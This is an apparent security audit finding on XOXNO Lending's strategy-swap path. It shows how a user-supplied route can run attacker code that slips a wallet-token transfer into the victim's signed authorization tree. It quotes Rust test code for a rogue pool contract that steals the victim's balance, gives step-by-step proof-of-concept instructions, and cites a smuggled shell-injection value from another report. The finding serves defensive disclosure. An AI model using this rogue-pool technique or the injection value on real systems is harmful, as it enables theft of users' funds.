### Title
User-controlled route XDR causes the swap path to execute attacker-chosen contract code under the caller's authorization tree, enabling wallet-token theft - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The command-injection class in the report — untrusted input embedded in a string that is split and executed as extra commands — maps onto XOXNO Lending's strategy-swap path: the caller-supplied `swap` route (`StrategySwap` XDR) is forwarded verbatim to the router, which `invoke_contract`s the pool/token addresses the payload names with no allowlist. Like the `|` boundary in `shell_exec`, the route payload is a boundary where user input becomes execution. An attacker who supplies a crafted route puts arbitrary code on the call stack beneath the victim's `require_auth`, and a malicious "pool" can attach a `token.transfer(victim, attacker, ...)` of an unrelated wallet token as a child of the victim's signed authorization entry. This is proven in-repo by `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` and documented in `docs/explanation/threat-model.md:154-165`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_tokens` authorizes only one exact input-token transfer to the router and then calls `router.execute_strategy(&controller, &amount_in, swap)` under the flash guard. Nothing validates the route's contents: `storage::get_swap_aggregator` is trusted, but the payload's `assets`/`ops` registries name arbitrary contract addresses, and the router keeps no venue allowlist (ADR-0018: "Registries need not be unique"; threat-model: "the router calls the pool and token addresses its payload names and keeps no allowlist"). [4](#0-3) [5](#0-4) 

When an entrypoint such as `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` is invoked with a route whose hop `pool` is an attacker-deployed contract, that contract executes while the initiator's root authorization is on the stack. Inside it, `token::Client::transfer(&victim, &attacker, &amount)` on any token is recorded by the host as a child invocation of the caller's auth entry; simulation returns that poisoned tree, and if the signed envelope includes it, the transfer executes. The test demonstrates the full mechanics: `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows the rogue transfer recorded as a sub-invocation of Alice's `swap_collateral` entry and her 77,770-unit wallet balance moved to the attacker, and `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` shows the same route succeeding once the signed tree contains the injected child. [6](#0-5) [7](#0-6) 

This is the exact analog of the restic `--repo '|touch /root/x|'` injection: user input crosses an execution boundary (command string → `shell_exec` split; route XDR → `invoke_contract` of named addresses) and smuggles an extra operation into a privileged context — root via sudoers there, the victim's signature scope here. [8](#0-7) 

### Impact Explanation
Theft of user funds beyond the routed amount. The controller's own exposure is bounded (one exact input transfer, balance-delta output check), but the injected child call draws directly from the signer's wallet: any token the caller holds can be transferred to the attacker, unbounded by `total_in`, `min_out`, or the post-swap risk gate. The threat model itself states "The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it." Severity: High. [9](#0-8) 

### Likelihood Explanation
Requires the victim to submit a route supplied by the attacker (e.g., a malicious or compromised quote/route source) and to sign the simulated authorization tree containing the injected child — the standard blind-signing pattern, since `simulateTransaction` output is what wallets present. The route must still deliver `min_out`, so the swap looks economically normal; the theft rides along in the auth tree, invisible to slippage parameters. No privileged role is needed: any unprivileged address can deploy the rogue pool contract and craft the route. Likelihood is gated by getting a victim to use the malicious route, so Medium-to-High rather than unconditional. [10](#0-9) [11](#0-10) 

### Recommendation
Analog of the report's "array-syntax" fix — remove the injection boundary rather than sanitize the input:

- Maintain an on-chain venue allowlist in the swap-aggregator (owner-managed pool registry) and reject route instructions whose `pool`/token addresses are not registered, so user-supplied XDR cannot name arbitrary contracts. Alternatively, hard-pin venue adapters to pool addresses derived from a trusted source (e.g., factory lookup) rather than the payload.
- In `swap_tokens`, additionally verify post-swap that no unexpected authorizations were consumed — e.g., enforce at the controller boundary that the caller's auth tree contains exactly the single `token_in.transfer` child (a documented client-side check the protocol currently delegates to integrators in `threat-model.md:161-164`).
- If an allowlist is rejected for flexibility, treat this as a confirmed residual risk and enforce the client-side requirement contractually for integrators: decode the route, simulate, and refuse any auth tree whose children exceed the single input transfer. [12](#0-11) [11](#0-10) 

### Proof of Concept
The repository already contains the working PoC; the relevant steps against a deployed stack:

1. Attacker deploys a contract exposing a `swap()` function that calls `token::Client::new(victim_wallet_token).transfer(&victim, &attacker, &victim_balance)` — mirroring `RogueHopPool::swap` (`rogue_hop_pool_transfer_joins_caller_auth_tree.rs:62-71`). [13](#0-12) 
2. Attacker builds a `StrategySwap` route whose hop `pool` is that contract, with `token_in`/`token_out`/`min_out` set so the route still pays a fair output (the test's `UnlistedPoolRouter` returns `FAIR_OUT_ETH`), and delivers the `routeXdr` to the victim's client. [14](#0-13) 
3. Victim calls `controller.swap_collateral(alice, account_id, usdc_key, amount, eth_key, route)`. `simulateTransaction` records the rogue transfer as a sub-invocation of Alice's `swap_collateral` auth entry; the test asserts `recorded == [(alice, poisoned_root)]` with the stolen transfer embedded. [15](#0-14) 
4. Victim signs the simulated tree; `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` confirms `wallet(alice) == 0` and `wallet(attacker) == WALLET_BALANCE` while `supply_balance_raw(ETH) == FAIR_OUT_ETH` — the swap succeeds and looks legitimate. [7](#0-6) 

Note: this finding is adjacent to a documented threat-model boundary (clients "must" refuse poisoned trees), and swap-aggregator internals are nominally out of scope; the entrypoint and the authorization grant, however, live in in-scope `contracts/controller/src/strategies/swap.rs`, and no in-scope defense exists — the protocol relies entirely on off-chain client behavior to prevent a signature-scoped injection that its own route design enables. [16](#0-15)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-48)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L55-71)
```rust
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L230-269)
```rust
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
